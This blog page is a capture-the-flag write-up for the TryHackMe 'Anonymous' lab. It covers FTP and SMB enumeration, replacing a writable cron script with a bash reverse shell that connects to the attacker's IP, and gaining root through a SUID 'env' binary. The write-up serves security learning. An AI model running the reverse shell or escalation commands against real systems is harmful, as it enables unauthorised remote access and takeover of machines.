<!DOCTYPE html> <html lang="en-US"> <head prefix="og: http://ogp.me/ns#"> <meta charset="UTF-8" /> <meta http-equiv="X-UA-Compatible" content="ie=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <meta name="mobile-web-app-capable" content="yes" /> <meta name="apple-mobile-web-app-capable" content="yes" /> <meta name="application-name" content="Seif-Allah's Blog" /> <meta name="apple-mobile-web-app-status-bar-style" content="#fff" /> <meta name="apple-mobile-web-app-title" content="Seif-Allah's Blog" /> <title> TryHackMe: Anonymous WriteUp - Seif-Allah's Blog </title> <link rel="alternate" href="http://localhost:4000/THM-Anonymous/" hreflang="en-US" /> <link rel="canonical" href="http://localhost:4000/THM-Anonymous/" /> <meta name="description" content="TryHackMe: WriteUp for the Anonymous room (Level: Medium)" /> <meta name="referrer" content="no-referrer-when-downgrade" /> <meta property="fb:app_id" content="" /> <meta property="og:site_name" content="TryHackMe: Anonymous WriteUp | Seif-Allah Homrani" /> <meta property="og:title" content="TryHackMe: Anonymous WriteUp | Seif-Allah Homrani" /> <meta property="og:type" content="website" /> <meta property="og:url" content="http://localhost:4000/THM-Anonymous/" /> <meta property="og:description" content="TryHackMe: WriteUp for the Anonymous room (Level: Medium)" /> <meta property="og:image" content="http://localhost:4000/assets/images/writeups/thm/anonymous/se.png" /> <meta property="og:image:width" content="640" /> <meta property="og:image:height" content="640" /> <meta name="twitter:card" content="summary" /> <meta name="twitter:title" content="TryHackMe: Anonymous WriteUp | seifallah1" /> <meta name="twitter:url" content="http://localhost:4000/THM-Anonymous/" /> <meta name="twitter:site" content="@seifallah1" /> <meta name="twitter:creator" content="@seifallah1" /> <meta name="twitter:description" content="TryHackMe: WriteUp for the Anonymous room (Level: Medium)" /> <meta name="twitter:image" content="http://localhost:4000/assets/images/writeups/thm/anonymous/se.png" /> <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Seif-Allah's Blog" /> <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicons/apple-touch-icon.png" /> <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicons/favicon-32x32.png" /> <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicons/favicon-16x16.png" /> <link rel="manifest" href="/assets/favicons/site.webmanifest" /> <link rel="mask-icon" href="/assets/favicons/safari-pinned-tab.svg" color="#5bbad5" /> <meta name="apple-mobile-web-app-title" content="Jekyll Klise" /> <meta name="application-name" content="Jekyll Klise" /> <meta name="msapplication-TileColor" content="#da532c" /> <meta name="theme-color" content="#2c2c2c" /> <link rel="stylesheet" href="/assets/css/style.css" /> </head> <body data-theme="dark" class="notransition"> <script> const body = document.body; const data = body.getAttribute("data-theme"); const initTheme = (state) => { if (state === "dark") { body.setAttribute("data-theme", "dark"); } else if (state === "light") { body.removeAttribute("data-theme"); } else { localStorage.setItem("theme", data); } }; initTheme(localStorage.getItem("theme")); setTimeout(() => body.classList.remove("notransition"), 75); </script> <div class="navbar" role="navigation"> <nav class="menu"> <input type="checkbox" id="menu-trigger" class="menu-trigger" /> <label for="menu-trigger"> <span class="menu-icon"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <path d="M64,384H448V341.33H64Zm0-106.67H448V234.67H64ZM64,128v42.67H448V128Z" /> </svg> </span> </label> <a id="mode"> <svg class="mode-sunny" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>LIGHT</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> <svg class="mode-moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>DARK</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> </a> <div class="trigger"> <div class="trigger-container"><a class="menu-link" href="/">home</a><a class="menu-link" href="/archive/">archive</a><a class="menu-link" href="/about/">about</a></div> </div> </nav> </div> <div class="wrapper post"> <main class="page-content" aria-label="Content"> <article itemscope itemtype="https://schema.org/BlogPosting"> <header class="header"> <div class="tags"> <span itemprop="keywords"> <a class="tag" href="/tags/#thm">THM</a>, <a class="tag" href="/tags/#tryhackme">TRYHACKME</a>, <a class="tag" href="/tags/#writeup">WRITEUP</a>, <a class="tag" href="/tags/#anonymous">ANONYMOUS</a>, <a class="tag" href="/tags/#medium">MEDIUM</a>, <a class="tag" href="/tags/#ctf">CTF</a> </span> </div> <h1 class="header-title" itemprop="headline">TryHackMe: Anonymous WriteUp</h1> <div class="post-meta"> <time datetime="2020-10-22T00:00:00+01:00" itemprop="datePublished"> Oct 22, 2020 </time> <span itemprop="author" itemscope itemtype="https://schema.org/Person"> <span itemprop="name">Seif-Allah Homrani</span> </span> <time hidden datetime="" itemprop="dateModified"> Oct 22, 2020 </time> <span hidden itemprop="publisher" itemtype="Person">Seif-Allah Homrani</span> <span hidden itemprop="image">/assets/images/writeups/thm/anonymous/se.png</span> <span hidden itemprop="mainEntityOfPage"><p>Welcome, Welcome, Welcome and Welcome ! This is a WriteUp for the <a href="https://tryhackme.com/room/anonymous"><em>anonymous</em></a> room. I Had a lot of fun solving it and I absolutely recommend it.</p> </span> </div> </header> <div class="page-content" itemprop="articleBody"> <p>Welcome, Welcome, Welcome and Welcome ! This is a WriteUp for the <a href="https://tryhackme.com/room/anonymous"><em>anonymous</em></a> room. I Had a lot of fun solving it and I absolutely recommend it.</p> <h3 id="enumeration"> <a href="#enumeration" class="anchor-head"></a> Enumeration </h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Discovered open port 21/tcp on 10.10.9.178
Discovered open port 445/tcp on 10.10.9.178
Discovered open port 139/tcp on 10.10.9.178
Discovered open port 22/tcp on 10.10.9.178
</code></pre></div></div> <p>I couldn’t answer the 4th question using the <em>nmap</em> output, so I started enumerating the <em>ftp</em> server which was allowing the <em>anonymous login</em>, and I found some files inside a directory called <em>scripts</em> :</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-rwxr-xrwx    1 1000     1000          314 Jun 04 19:24 clean.sh
-rw-rw-r--    1 1000     1000         1505 Oct 22 19:45 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt
</code></pre></div></div> <p>The <em>clean.sh</em> script looks like it deletes any files inside the /tmp directory :</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="nv">tmp_files</span><span class="o">=</span>0
<span class="nb">echo</span> <span class="nv">$tmp_files</span>
<span class="k">if</span> <span class="o">[</span> <span class="nv">$tmp_files</span><span class="o">=</span>0 <span class="o">]</span>
<span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"Running cleanup script:  nothing to delete"</span> <span class="o">&gt;&gt;</span> /var/ftp/scripts/removed_files.log
<span class="k">else
    for </span>LINE <span class="k">in</span> <span class="nv">$tmp_files</span><span class="p">;</span> <span class="k">do
        </span><span class="nb">rm</span> <span class="nt">-rf</span> /tmp/<span class="nv">$LINE</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">date</span><span class="si">)</span><span class="s2"> | Removed file /tmp/</span><span class="nv">$LINE</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> /var/ftp/scripts/removed_files.log<span class="p">;</span><span class="k">done
fi</span>
</code></pre></div></div> <p>The <em>removed_files.log</em> file was filled with :</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Running cleanup script:  nothing to delete
</code></pre></div></div> <p>The <em>to_do.txt</em> was just telling that he needs to disable the ftp anonymous login.</p> <p>So after enumerating the <em>ftp</em> server, let’s go back and check the <em>smb</em>; but before that let’s explain what is <em>smb</em>: SMB stands for <em>sever message block</em>. It’s a protocol for sharing resources like files, printers, in general any resource which should be retrievable or made available by the server. It primarily runs on port 445 or port 139 depending on the server . It is actually natively available in windows, so windows users don’t need to configure anything extra as such besides basic setting up. In linux however ,it is a little different. To make it work for linux, you need to install a samba server because linux natively does not use SMB protocol.</p> <p>First security flaw in the SMB is using default credentials or easily guessable and sometimes no authentication at all. The second flaw is the <em>samba server</em> which is extremely vulnerable.</p> <p>Ok ,so how do we enumerate when we find that in our nmap scan port 445 is open with samba server on. I only said samba server because linux is predominantly used by enterprises , around 75% to be precise. That being said, the process of enumeration for SMB is the same for both linux and windows with the exception that in linux , you have to check the samba version as well and check if it is vulnerable or not.</p> <p>I ran <em>nmap -sC -p 139,445 -sV 10.10.192.43</em> to know which Samba version is running; 4.7.6 After that I ran <em>smbmap</em> to enumerate the Samba server.</p> <hr /> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Documents/thm/anonymous# smbmap <span class="nt">-H</span> 10.10.192.43 <span class="nt">-R</span>
<span class="o">[</span>+] Finding open SMB ports....
<span class="o">[</span>+] Guest SMB session established on 10.10.192.43...
<span class="o">[</span>+] IP: 10.10.192.43:445        Name: 10.10.192.43                                      
        Disk                                                    Permissions     Comment
        <span class="nt">----</span>                                                    <span class="nt">-----------</span>     <span class="nt">-------</span>
        print<span class="nv">$ </span>                                                 NO ACCESS       Printer Drivers
        <span class="nb">.</span>                                                  
        dr--r--r--                0 Sun May 17 11:11:34 2020    <span class="nb">.</span>
        dr--r--r--                0 Thu May 14 01:59:10 2020    ..
        fr--r--r--            42663 Tue May 12 00:43:42 2020    corgo2.jpg
        fr--r--r--           265188 Tue May 12 00:43:42 2020    puppos.jpeg
        pics                                                    READ ONLY       My SMB Share Directory <span class="k">for </span>Pics
        .<span class="se">\</span>
        dr--r--r--                0 Sun May 17 11:11:34 2020    <span class="nb">.</span>
        dr--r--r--                0 Thu May 14 01:59:10 2020    ..
        <span class="nt">-r--r--r--</span>            42663 Tue May 12 00:43:42 2020    corgo2.jpg
        <span class="nt">-r--r--r--</span>           265188 Tue May 12 00:43:42 2020    puppos.jpeg
        IPC<span class="nv">$ </span>                                                   NO ACCESS       IPC Service <span class="o">(</span>anonymous server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
</code></pre></div></div><hr /> <p>-H stands for host and -R stands for recursive switch to list all the files. Answering Question 4 : The share on the user’s computer is <strong>Pics</strong>. Now you can actually retrieve the files using smbmap as well, I’ll leave that as an exercise. But what if we wanted a full fledged command prompt like a ftp prompt? That’s very much possible with smbclient. Lets try to do that.</p><hr /> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Documents/thm/anonymous# smbclient <span class="se">\\\\</span>10.10.192.43<span class="se">\\</span>pics
Enter WORKGROUP<span class="se">\s</span>eifallah<span class="s1">'s password: 
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Sun May 17 11:11:34 2020
  ..                                  D        0  Thu May 14 01:59:10 2020
  corgo2.jpg                          N    42663  Tue May 12 00:43:42 2020
  puppos.jpeg                         N   265188  Tue May 12 00:43:42 2020

                20508240 blocks of size 1024. 13306812 blocks available
</span></code></pre></div></div><hr /> <p>I used <em>get</em> command to get the images, nothing special about some poppies pics. I used <em>binwalk</em> and <em>strings</em> but I found nothing.</p> <h3 id="user-flag"> <a href="#user-flag" class="anchor-head"></a> User Flag </h3> <p>So I went back to the ftp server, and took a look again to <em>clean.sh</em> file, and since it’s executable and writable, I used it to make a reverse shell; script from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a>.</p> <hr /> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.4.14.245/1234 0&gt;&amp;1
</code></pre></div></div><hr /> <p>Then I started my local listener, upload the new file using <em>put</em> command and waited some seconds for the cronjob to be executed.</p><hr /><pre><code class="language-ftp">ftp&gt; put clean.sh 
local: clean.sh remote: clean.sh
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
359 bytes sent in 0.00 secs (4.5649 MB/s)
</code></pre><hr /> <p>And boom! we got the reverse shell, easy !</p><hr /> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# nc <span class="nt">-nlvp</span> 1234
listening on <span class="o">[</span>any] 1234 ...
connect to <span class="o">[</span>10.4.14.245] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.146.152] 55120
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1241<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
namelessone@anonymous:~<span class="nv">$ </span>
</code></pre></div></div><hr /> <p>I found the <em>user.txt</em> file in the powered directory. Now I need some PrivEsc.</p> <h3 id="privesc"> <a href="#privesc" class="anchor-head"></a> PrivEsc </h3> <p>Using the hint : <em>This may require you to do some outside research</em> first thing came into my mind is SUID files</p> <hr /> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-user</span> root <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-ldb</span> <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null 
</code></pre></div></div><hr /> <p>looking at the output, we could use <em>env</em> file. Using <a href="https://gtfobins.github.io/gtfobins/env/#suid">GTFObins</a>, here’s the result :</p><hr /> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>namelessone@anonymous:~<span class="nv">$ </span>/usr/bin/env /bin/bash <span class="nt">-p</span>
/usr/bin/env /bin/bash <span class="nt">-p</span>
<span class="nb">ls
</span>pics
user.txt
<span class="nb">whoami
</span>root
</code></pre></div></div><hr /> <p>Now easily run this command to get the <em>root.txt</em> file.</p><hr /> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /root/root.txt
</code></pre></div></div><hr /> </div> </article> </main> <nav class="post-nav"> <a class="post-nav-item post-nav-prev" href="/THM-Lazy-Admin/" > <div class="nav-arrow">Previous</div> <span class="post-title">TryHackMe: Lazy Admin</span> </a> <a class="post-nav-item post-nav-next" href="/Over-The-Wire-Natas/"> <div class="nav-arrow">Next</div> <span class="post-title">OverTheWire - Natas : 11 Levels</span> </a> </nav> <footer class="footer"> Made by <a href="https://github.com/seifallahhomrani1" target="_blank" rel="noreferrer noopener" >Seif-Allah</a> <span class="footer_item">&copy; 2021</span> <small class="footer_copyright"> </small> </footer> <script src="/assets/js/main.js" defer="defer"></script> </div> </body> </html>
